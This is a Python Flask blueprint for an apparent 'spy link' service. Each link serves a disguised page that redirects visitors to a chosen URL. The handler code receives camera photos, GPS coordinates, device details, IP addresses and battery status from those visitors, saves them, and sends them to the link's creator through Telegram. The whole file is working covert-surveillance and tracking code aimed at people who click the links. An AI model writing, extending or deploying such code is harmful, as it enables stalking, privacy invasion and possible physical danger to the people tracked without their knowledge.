import os
import time
import base64
import datetime

from flask import Blueprint, request, jsonify, session, render_template_string, current_app

from config import config
from core.storage import load_json, save_json, PHOTO_DIR
from core.telegram import send_photo, send_location, send_message
from templates.spy_page import SPY_PAGE

bp = Blueprint('spy', __name__)


def _render_spy(link_id):
    links = load_json('links.json')
    if not link_id or link_id not in links:
        return "Invalid or missing spy link. Use /s/<id>", 404

    link_data = links.get(link_id, {})
    target_url = link_data.get('url', 'https://google.com')

    visitor_id = session.get('visitor_id')
    if not visitor_id or session.get('link_id') != link_id:
        visitor_id = f"VIS_{int(time.time())}_{os.urandom(4).hex()}"
        session['visitor_id'] = visitor_id
        session['link_id'] = link_id

    return render_template_string(
        SPY_PAGE,
        visitor_id=visitor_id,
        target_url=target_url,
        link_id=link_id
    )


def _handle_capture(route_link_id=None):
    try:
        data = request.get_json(silent=True)
        if data is None:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        if not isinstance(data, list):
            data = [data]

        visitor_id = (
            (data[0].get('vid') if data else None)
            or session.get('visitor_id')
            or request.args.get('vid')
        )
        if not visitor_id:
            return jsonify({'status': 'error', 'message': 'Visitor ID missing'}), 400

        link_id = ''
        if data and data[0].get('link_id'):
            link_id = data[0]['link_id']
        if not link_id:
            link_id = request.args.get('id') or request.args.get('link_id') or route_link_id or ''

        # Resolve recipient
        links = load_json('links.json')
        link_data = links.get(link_id) if link_id else None
        if not link_data:
            current_app.logger.warning(f"Capture dropped: invalid link_id={link_id!r}")
            return jsonify({'status': 'ignored', 'reason': 'invalid link'}), 200
        owner_id = str(link_data.get('created_by') or '')
        if not owner_id:
            current_app.logger.warning(f"Capture dropped: link {link_id} has no created_by")
            return jsonify({'status': 'ignored'}), 200

        visitors = load_json('visitors.json')
        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if visitor_id not in visitors:
            visitors[visitor_id] = {
                'device': request.headers.get('User-Agent', 'Unknown'),
                'ip': request.remote_addr,
                'target_url': link_data.get('url', 'N/A'),
                'generated_by': owner_id,
                'link_id': link_id,
                'time': now,
                'photos': 0,
                'locations': 0,
                'battery': 0,
            }
        visitors[visitor_id]['last_update'] = now

        for item in data:
            # Photo
            if item.get('photo'):
                pd = item['photo']
                if 'base64,' in pd:
                    pd = pd.split('base64,', 1)[1]
                try:
                    binary = base64.b64decode(pd)
                except Exception:
                    binary = b''
                if len(binary) > 500:
                    fname = f"{visitor_id}_{int(time.time()*1000)}.jpg"
                    path = os.path.join(PHOTO_DIR, fname)
                    with open(path, 'wb') as f:
                        f.write(binary)
                    visitors[visitor_id]['photos'] += 1
                    send_photo(owner_id, path,
                               f"📸 Spy Photo\n🆔 {visitor_id}\n⏰ {now}")

            # Location
            loc = item.get('location')
            if loc:
                lat, lng = loc.get('lat', 0), loc.get('lng', 0)
                if lat and lng:
                    visitors[visitor_id]['locations'] += 1
                    send_location(owner_id, lat, lng)
                    send_message(owner_id,
                                 f"📍 Live Location\n🆔 {visitor_id}\nhttps://maps.google.com/?q={lat},{lng}",
                                 parse_mode=None)

            # Battery
            bat = item.get('battery')
            if bat and bat.get('level', 0) > 0:
                visitors[visitor_id]['battery'] = bat['level']
                status = "Charging" if bat.get('charging') else "Not Charging"
                send_message(owner_id,
                             f"🔋 Battery\n🆔 {visitor_id}\nLevel: {bat['level']}%\nStatus: {status}",
                             parse_mode=None)

        save_json('visitors.json', visitors)
        return jsonify({'status': 'success'})
    except Exception as e:
        current_app.logger.exception("capture error")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@bp.route('/', methods=['GET'])
def index():
    link_id = request.args.get('id', '')
    if not link_id:
        return "Missing link id — use /s/<id>", 400
    return _render_spy(link_id)


@bp.route('/', methods=['POST'])
def index_post():
    return _handle_capture()


@bp.route('/s/<link_id>', methods=['GET'])
def short(link_id):
    return _render_spy(link_id)


@bp.route('/s/<link_id>', methods=['POST'])
def short_post(link_id):
    return _handle_capture(route_link_id=link_id)